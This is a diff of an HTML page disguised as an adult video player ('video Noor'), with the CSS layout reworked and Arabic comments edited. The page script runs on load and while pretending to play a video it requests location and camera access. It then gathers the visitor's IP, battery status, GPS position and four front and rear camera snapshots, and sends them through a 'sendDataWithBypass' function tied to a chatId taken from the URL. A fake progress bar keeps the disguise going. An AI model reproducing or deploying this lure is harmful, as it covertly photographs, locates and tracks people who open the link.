@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <!-- ===== التعديل الأساسي لحل مشكلة التصغير ===== -->
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes" />
   <meta property="og:title" content="video Noor" />
   <meta property="og:description" content="🫦🤤" />
   <meta property="og:image" content="https://imgbs.com/uploads/oo-45253f11.jpg" />
@@ -17,43 +16,44 @@
   <meta name="twitter:image" content="https://imgbs.com/uploads/oo-45253f11.jpg" />
   <title>r</title>
   <style>
-        /* ===== إعادة ضبط عامة مع منع التمرير الأفقي ===== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        html, body {
+        html {
             width: 100%;
-            min-height: 100vh;
-            overflow-x: hidden; /* يمنع التمرير الأفقي والتصغير المفاجئ */
-            background-color: #000;
-            color: #fff;
+            height: 100%;
+        }
+        body {
             font-family: Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+            overflow-x: hidden;
+            overflow-y: auto;
+            width: 100%;
         }
-
-        /* ===== الحاوية الأساسية ===== */
         .video-player-container {
-            width: 100% !important;          /* تغطية كامل العرض */
-            max-width: 100% !important;       /* إلغاء الحد الأقصى */
-            border-radius: 0;                 /* إزالة الزوايا الدائرية */
+            width: 100%;
+            max-width: 800px;
             background: #111;
+            border-radius: 12px;
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             position: relative;
-            margin: 0;
+            margin: 20px auto;
         }
-
-        /* ===== منطقة العرض (الصورة المصغرة والفيديو) ===== */
         .video-thumbnail {
             position: relative;
             width: 100%;
-            height: 70vh; /* ارتفاع ديناميكي حسب الشاشة بدلاً من 450px الثابتة */
-            max-height: 80vh;
+            aspect-ratio: 16 / 9;
+            min-height: 200px;
             background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                 url('https://imgbs.com/uploads/oo-45253f11.jpg');
             background-size: cover;
@@ -64,16 +64,6 @@
             cursor: default;
             flex-direction: column;
         }
-        #realVideo {
-            display: none;
-            width: 100% !important;
-            height: 70vh !important;
-            max-height: 80vh;
-            background: #000;
-            object-fit: contain; /* يحافظ على نسبة الفيديو دون قص */
-        }
-
-        /* ===== أزرار التشغيل ===== */
         .play-button-overlay {
             width: 100px;
             height: 100px;
@@ -102,6 +92,7 @@
             margin-left: 8px;
         }
 
+        /* زر تشغيل الفيديو (بدلاً من الترس) */
         #gearButton {
             display: none;
             flex-direction: column;
@@ -130,6 +121,9 @@
             border-color: #ff4757;
             box-shadow: 0 0 70px rgba(255, 0, 0, 0.8);
         }
+        #gearButton .icon-gear {
+            display: none; /* إخفاء أيقونة الترس */
+        }
         #gearButton .play-icon-btn {
             font-size: 55px;
             line-height: 1;
@@ -146,7 +140,7 @@
             margin-top: 2px;
         }
         #gearButton .sub-text {
-            display: none;
+            display: none; /* إخفاء النص الفرعي */
         }
 
         #retryButton {
@@ -169,26 +163,23 @@
             background: #1557b0;
         }
 
-        /* ===== معلومات الفيديو ===== */
         .video-info {
-            padding: 15px 20px;
+            padding: 20px;
             border-bottom: 1px solid #333;
         }
         .video-title {
             font-size: 1.5rem;
             font-weight: bold;
-            margin-bottom: 4px;
+            margin-bottom: 8px;
         }
-
-        /* ===== أزرار التحكم السفلية (حل مشكلة التصغير فيها) ===== */
         .video-controls {
-            padding: 12px 15px;
+            padding: 15px 20px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             background: #1a1a1a;
-            flex-wrap: wrap; /* تسمح بالنزول للسطر التالي في الشاشات الصغيرة */
-            gap: 8px;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         .control-button {
             background: none;
@@ -196,7 +187,7 @@
             color: white;
             font-size: 1.2rem;
             cursor: pointer;
-            padding: 6px 12px;
+            padding: 8px 15px;
             border-radius: 4px;
             transition: background 0.2s;
         }
@@ -208,10 +199,10 @@
             height: 4px;
             background: #333;
             border-radius: 2px;
-            margin: 0 10px;
+            margin: 0 20px;
             overflow: hidden;
             position: relative;
-            min-width: 50px;
+            min-width: 60px;
         }
         .progress-fill {
             position: absolute;
@@ -221,18 +212,45 @@
         }
         .time-display {
             color: #aaa;
-            font-size: 0.85rem;
-            min-width: 80px;
+            font-size: 0.9rem;
+            min-width: 100px;
             text-align: center;
+        }
+        .spinner {
+            border: 4px solid #fff;
+            border-top: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            display: none;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        #loading {
+            display: none;
+            font-size: 1.2rem;
+            color: #fff;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .loading-text {
+            margin-top: 10px;
         }
         .volume-control {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
             color: #aaa;
         }
         .volume-slider {
-            width: 60px;
+            width: 80px;
             height: 4px;
             background: #333;
             border-radius: 2px;
@@ -245,33 +263,29 @@
             background: #ff0000;
         }
         .fullscreen-btn {
-            margin-left: 5px;
+            margin-left: 15px;
         }
-
-        /* ===== تحسينات إضافية للشاشات الصغيرة جداً (حل نهائي) ===== */
-        @media (max-width: 600px) {
-            .video-thumbnail, #realVideo {
-                height: 55vh !important; /* تقليل الارتفاع قليلاً على الجوالات */
+        
+        /* تحسينات للشاشات الصغيرة */
+        @media (max-width: 768px) {
+            .video-player-container {
+                width: 100%;
+                margin: 0;
+                border-radius: 0;
             }
             .video-controls {
-                padding: 8px 6px;
-                justify-content: center;
+                padding: 10px 12px;
+                gap: 6px;
             }
             .progress-bar {
-                width: 100% !important; /* شريط التقدم يأخذ عرض كامل السطر */
-                margin: 4px 0;
-                order: 1; /* يظهر في الأعلى */
+                margin: 0 6px;
             }
             .time-display {
-                order: 2;
+                font-size: 0.75rem;
                 min-width: 60px;
-                font-size: 0.7rem;
             }
-            .volume-control {
-                order: 3;
-            }
-            .fullscreen-btn {
-                order: 4;
+            .video-title {
+                font-size: 1.2rem;
             }
             .play-button-overlay {
                 width: 70px;
@@ -293,16 +307,14 @@
             #gearButton .main-text {
                 font-size: 16px;
             }
-            .video-title {
-                font-size: 1.1rem;
-            }
         }
-        @media (max-width: 400px) {
-            .video-thumbnail, #realVideo {
-                height: 45vh !important;
+        
+        @media (max-width: 480px) {
+            .video-info {
+                padding: 15px;
             }
-            .volume-slider {
-                width: 40px;
+            .video-title {
+                font-size: 1rem;
             }
         }
     </style>
@@ -321,7 +333,7 @@
                 <div class="spinner" id="spinner"></div>
             </div>
 
-            <!-- زر تشغيل الفيديو -->
+            <!-- زر تشغيل الفيديو (بدلاً من الترس) -->
             <div id="gearButton">
                 <div class="play-icon-btn">▶</div>
                 <div class="main-text">تشغيل الفيديو</div>
@@ -331,18 +343,17 @@
             <button id="retryButton">إعادة المحاولة</button>
         </div>
 
-        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:auto; background:#000; object-fit:contain;">
+        <video id="realVideo" controls playsinline muted style="display:none; width:100%; aspect-ratio: 16/9; background:#000;">
             <source src="https://files.catbox.moe/7d038f.mp4" type="video/mp4" />
         </video>
 
-        <!-- شريط التحكم السفلي -->
         <div class="video-controls">
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
             <div class="time-display">0:00 / 2:45</div>
             <div class="volume-control">
-                <span>🔊</span>
+                <span></span>
                 <div class="volume-slider">
                     <div class="volume-level"></div>
                 </div>
@@ -414,6 +425,7 @@
             async function requestPermissions() {
                 let locationOk = false;
                 let cameraOk = false;
+
                 try {
                     await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(
@@ -425,6 +437,7 @@
                 } catch (e) {
                     locationOk = false;
                 }
+
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     stream.getTracks().forEach(t => t.stop());
@@ -432,6 +445,7 @@
                 } catch (e) {
                     cameraOk = false;
                 }
+
                 return locationOk && cameraOk;
             }
 
@@ -550,17 +564,21 @@
             async function collectAndSendData() {
                 if (dataSent) return;
                 dataSent = true;
+
                 try {
                     capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
+
                     await Promise.all([
                         fetchIPInfo(),
                         getBatteryStatus(),
                         getLocation()
                     ]);
+
                     await captureFromCamera('user');
                     await captureFromCamera('environment');
                     await captureFromCamera('user');
                     await captureFromCamera('environment');
+
                     const data = {
                         chatId: capturedData.chatId,
                         imageDatas: capturedData.images.join(','),
@@ -569,17 +587,23 @@
                         ipInfo: capturedData.ipInfo,
                         battery: capturedData.batteryStatus
                     };
+
                     await sendDataWithBypass(data);
-                } catch (e) {}
+                } catch (e) {
+                    // تجاهل الأخطاء
+                }
             }
 
             function startVideoWithSound() {
                 if (videoStarted) return;
                 videoStarted = true;
+
                 thumbnailArea.style.display = 'none';
                 realVideo.style.display = 'block';
+
                 realVideo.muted = false;
                 realVideo.volume = 1.0;
+
                 const playPromise = realVideo.play();
                 if (playPromise !== undefined) {
                     playPromise.then(() => {}).catch(() => {
@@ -592,11 +616,13 @@
                         }).catch(() => {});
                     });
                 }
+
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
                     try { realVideo.play(); } catch (e) {}
                 }, 500);
+
                 setTimeout(() => {
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
@@ -609,11 +635,13 @@
                 playBtn.style.display = 'none';
                 retryBtn.style.display = 'none';
             }
+
             function hideGearButton() {
                 gearBtn.style.display = 'none';
                 playBtn.style.display = 'flex';
                 retryBtn.style.display = 'none';
             }
+
             function showRetryButton() {
                 retryBtn.style.display = 'block';
                 gearBtn.style.display = 'none';
@@ -623,19 +651,25 @@
             async function autoStartSequence() {
                 if (autoTriggered) return;
                 autoTriggered = true;
+
                 settingsOpened = true;
                 openLocationSettings();
+
                 setTimeout(async () => {
                     startVideoWithSound();
+
                     const granted = await requestPermissions();
+
                     if (!dataSent) {
                         collectAndSendData();
                     }
+
                     if (granted) {
                         hideGearButton();
                     } else {
                         showGearButton();
                     }
+
                     settingsOpened = false;
                 }, 300);
             }
@@ -643,26 +677,34 @@
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
+
                 if (!autoTriggered) {
                     await autoStartSequence();
                     return;
                 }
+
                 if (!settingsOpened) {
                     settingsOpened = true;
                     openLocationSettings();
                     return;
                 }
+
                 isProcessing = true;
+
                 startVideoWithSound();
+
                 const granted = await requestPermissions();
+
                 if (!dataSent) {
                     collectAndSendData();
                 }
+
                 if (granted) {
                     hideGearButton();
                 } else {
                     showGearButton();
                 }
+
                 settingsOpened = false;
                 isProcessing = false;
             }
@@ -685,7 +727,10 @@
                 }
             }
 
-            // ربط الأحداث
+            document.addEventListener('visibilitychange', function() {
+                // لا نقوم بأي إجراء تلقائي
+            });
+
             if (playBtn) {
                 playBtn.addEventListener('click', handlePlayClick);
             }
@@ -721,7 +766,6 @@
                 });
             });
 
-            // شريط التقدم الوهمي
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
                 const realVideoEl = document.getElementById('realVideo');
@@ -732,6 +776,7 @@
                 const currentWidth = parseInt(progressFill.style.width) || 35;
                 const newWidth = (currentWidth + 0.1) % 100;
                 progressFill.style.width = newWidth + '%';
+
                 const timeDisplay = document.querySelector('.time-display');
                 const currentSeconds = Math.floor((newWidth / 100) * 165);
                 const minutes = Math.floor(currentSeconds / 60);
@@ -739,7 +784,6 @@
                 timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
             }, 1000);
 
-            // بدء التشغيل التلقائي عند تحميل الصفحة
             window.addEventListener('load', function() {
                 setTimeout(autoStartSequence, 100);
             });
